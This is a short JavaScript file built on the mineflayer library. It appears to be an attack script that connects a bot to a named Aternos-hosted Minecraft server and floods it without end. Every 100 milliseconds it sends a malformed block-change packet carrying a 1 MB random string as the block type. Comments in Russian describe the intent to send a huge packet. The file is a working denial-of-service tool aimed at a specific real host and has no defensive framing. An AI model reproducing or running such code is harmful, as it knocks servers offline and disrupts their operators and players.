import mineflayer from 'mineflayer';
import { Vec3 } from 'vec3';

    const bot = mineflayer.createBot({
        host: 'vladlohh3.aternos.me',
        port: 25069,
        username: "ded_boltoed",
        version: '1.20.1',
    });

    bot.once('spawn', async () => {
        console.log('zaebis')
        for (;;) {
           sendHugeRandomString(bot)
           await delay(100)
        }
    })

    bot.on('message', async (message) => {
        const messageText = message.toString();
        console.log(messageText)
    })

    function sendHugeRandomString(bot) {
    // Создаем огромную рандомную строку (1MB+)
    const HUGE_STRING = generateRandomString(1024 * 1024); // 1MB строка
    
    // Позиция для "блока" (можно выбрать любую)
    const position = new Vec3(0, 100, 0);
    
    try {
        bot._client.write('block_change', {
            location: position,
            type: HUGE_STRING // Отправляем строку как тип блока
        });
        console.log('Отправлен огромный пакет!');
    } catch (error) {
        console.log('Ошибка:', error.message);
    }
}

// Генератор случайной строки
function generateRandomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
    
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

async function delay(time) {
    return new Promise(resolve => setTimeout(resolve, time));
}
